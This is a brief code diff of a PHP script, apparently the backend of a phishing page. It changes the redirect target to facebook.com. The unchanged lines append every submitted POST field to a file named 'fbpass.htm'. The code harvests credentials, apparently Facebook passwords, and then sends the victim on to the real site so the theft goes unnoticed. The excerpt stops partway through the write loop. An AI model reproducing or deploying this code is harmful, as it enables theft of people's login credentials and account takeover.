@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://www.daraz.pk/amazing-finds-trending-500/?source=hptaf');
+header ('Location:http://www.facebook.com');
 $handle = fopen("fbpass.htm", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
